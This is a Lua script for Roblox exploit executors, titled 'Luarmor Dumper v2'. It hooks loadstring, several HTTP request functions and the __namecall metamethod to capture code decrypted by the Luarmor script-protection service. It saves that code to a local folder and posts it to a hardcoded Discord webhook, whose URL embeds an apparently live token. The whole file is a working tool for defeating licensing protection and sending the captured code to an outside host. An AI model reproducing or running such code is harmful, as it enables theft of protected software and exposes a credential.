--[[
    Luarmor Dumper v2
    Hooks loadstring + all HTTP methods to capture decrypted payload
]]

local WEBHOOK = "https://discord.com/api/webhooks/1512685201141272736/0i_pKRKISAT_DUXh6IuauiL4S9ZDsmz-xgv-kIXYBjjkScVG51e2iTgf_HsHaUJu-3Of"

local function send(msg)
    local body = game:GetService("HttpService"):JSONEncode({content = "```lua\n" .. msg:sub(1, 1900) .. "\n```"})
    local headers = {["Content-Type"] = "application/json"}
    pcall(function()
        if http_request then http_request({Url = WEBHOOK, Method = "POST", Headers = headers, Body = body})
        elseif request then request({Url = WEBHOOK, Method = "POST", Headers = headers, Body = body})
        elseif syn and syn.request then syn.request({Url = WEBHOOK, Method = "POST", Headers = headers, Body = body})
        end
    end)
end

local function saveFile(name, content)
    pcall(function()
        if not isfolder("luarmor_dump") then makefolder("luarmor_dump") end
        writefile("luarmor_dump/" .. name .. ".lua", content)
    end)
end

-- HOOK 1: loadstring
local oldLoadstring = loadstring
loadstring = function(code, name)
    if code and type(code) == "string" and #code > 100 then
        local dumpName = name or ("ls_" .. tick():gsub("%.", ""))
        saveFile(dumpName, code)
        send("[LOADSTRING] " .. dumpName .. " (" .. #code .. " bytes)\n" .. code:sub(1, 1500))
    end
    return oldLoadstring(code, name)
end

-- HOOK 2: game:HttpGet / game:HttpGetAsync / HttpService:RequestAsync
pcall(function()
    local HttpService = game:GetService("HttpService")
    
    -- Try hooking game:HttpGet (might not exist in all executors)
    pcall(function()
        local oldHttpGet = game.HttpGet
        if oldHttpGet then
            game.HttpGet = function(self, url, ...)
                local result = oldHttpGet(self, url, ...)
                if result and type(result) == "string" and #result > 100 then
                    local safeName = url:gsub("[^%w]", "_"):sub(1, 50)
                    saveFile("http_" .. safeName, result)
                    send("[HTTP_GET] " .. url .. " (" .. #result .. " bytes)\n" .. result:sub(1, 1500))
                end
                return result
            end
        end
    end)
    
    -- Try hooking game:HttpGetAsync
    pcall(function()
        local oldHttpGetAsync = game.HttpGetAsync
        if oldHttpGetAsync then
            game.HttpGetAsync = function(self, url, ...)
                local result = oldHttpGetAsync(self, url, ...)
                if result and type(result) == "string" and #result > 100 then
                    local safeName = url:gsub("[^%w]", "_"):sub(1, 50)
                    saveFile("async_" .. safeName, result)
                    send("[HTTP_ASYNC] " .. url .. " (" .. #result .. " bytes)\n" .. result:sub(1, 1500))
                end
                return result
            end
        end
    end)
    
    -- Hook HttpService:RequestAsync
    pcall(function()
        local oldRequestAsync = HttpService.RequestAsync
        HttpService.RequestAsync = function(self, opts)
            local result = oldRequestAsync(self, opts)
            if result and result.Body and #result.Body > 100 then
                local url = opts and opts.Url or "unknown"
                local safeName = url:gsub("[^%w]", "_"):sub(1, 50)
                saveFile("req_" .. safeName, result.Body)
                send("[REQUEST] " .. url .. " (" .. #result.Body .. " bytes)\n" .. result.Body:sub(1, 1500))
            end
            return result
        end
    end)
end)

-- HOOK 3: Global HTTP functions (http_request, request, syn.request)
pcall(function()
    if http_request then
        local old = http_request
        http_request = function(opts)
            local result = old(opts)
            if opts and opts.Url and opts.Url:find("luarmor") then
                send("[HTTP_REQ] " .. opts.Url .. " method=" .. (opts.Method or "?"))
                if result and result.Body and #result.Body > 100 then
                    saveFile("hreq_" .. opts.Url:gsub("[^%w]", "_"):sub(1, 50), result.Body)
                    send("[BODY] " .. #result.Body .. " bytes\n" .. result.Body:sub(1, 1500))
                end
            end
            return result
        end
    end
end)

pcall(function()
    if request then
        local old = request
        request = function(opts)
            local result = old(opts)
            if opts and opts.Url and opts.Url:find("luarmor") then
                send("[REQ] " .. opts.Url)
                if result and result.Body and #result.Body > 100 then
                    saveFile("req2_" .. opts.Url:gsub("[^%w]", "_"):sub(1, 50), result.Body)
                end
            end
            return result
        end
    end
end)

pcall(function()
    if syn and syn.request then
        local old = syn.request
        syn.request = function(opts)
            local result = old(opts)
            if opts and opts.Url and opts.Url:find("luarmor") then
                send("[SYN_REQ] " .. opts.Url)
                if result and result.Body and #result.Body > 100 then
                    saveFile("syn_" .. opts.Url:gsub("[^%w]", "_"):sub(1, 50), result.Body)
                end
            end
            return result
        end
    end
end)

-- HOOK 4: Hook metamethods (for namecall-based HttpGet)
pcall(function()
    if hookmetamethod and getnamecallmethod then
        local oldNamecall
        oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
            local method = getnamecallmethod()
            if method == "HttpGet" or method == "HttpGetAsync" then
                local args = {...}
                local url = args[1] or "unknown"
                local result = oldNamecall(self, ...)
                if result and type(result) == "string" and #result > 100 then
                    local safeName = tostring(url):gsub("[^%w]", "_"):sub(1, 50)
                    saveFile("nc_" .. safeName, result)
                    send("[NAMECALL_" .. method .. "] " .. url .. " (" .. #result .. " bytes)\n" .. result:sub(1, 1500))
                end
                return result
            end
            return oldNamecall(self, ...)
        end)
    end
end)

send("=== Luarmor Dumper v2 Active ===\nHooks: loadstring, HttpGet, HttpGetAsync, RequestAsync, http_request, request, syn.request, __namecall\nWaiting for payload...")

print("[Dumper v2] All hooks installed!")
print("[Dumper v2] Now run the Luarmor loadstring.")
print("[Dumper v2] Results → Discord webhook + luarmor_dump/ folder")
